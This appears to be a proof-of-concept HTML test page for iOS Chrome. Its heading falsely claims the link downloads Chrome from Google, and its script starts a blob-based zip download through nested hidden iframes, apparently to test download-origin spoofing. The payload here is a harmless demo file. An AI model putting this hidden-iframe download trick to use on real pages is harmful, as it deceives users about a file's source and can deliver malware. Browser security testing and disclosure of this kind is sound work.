
<h1>click link to download chrome from google</h1>
<h1>this is  test case #2 for ios chrome</h1>

<a href="#" onclick="poc()">click me</a>
<iframe id="loader" src style="display:none"></iframe>
<script>
    function poc(){
        var downloadContent = new Blob(["demo file content"], {type: "application/zip"});
        var downloadUrl = URL.createObjectURL(downloadContent);

        var html = '<iframe id="ifr" src style="display:none"></iframe>\n' +
            '<script>\n' +
            '    document.getElementById("ifr").src = "' + downloadUrl + '";\n' +
            '<\/script>';

        var blob = new Blob([html], {type: "text/html"});
        var url = URL.createObjectURL(blob);
        document.getElementById("loader").src = url;
    }
</script>
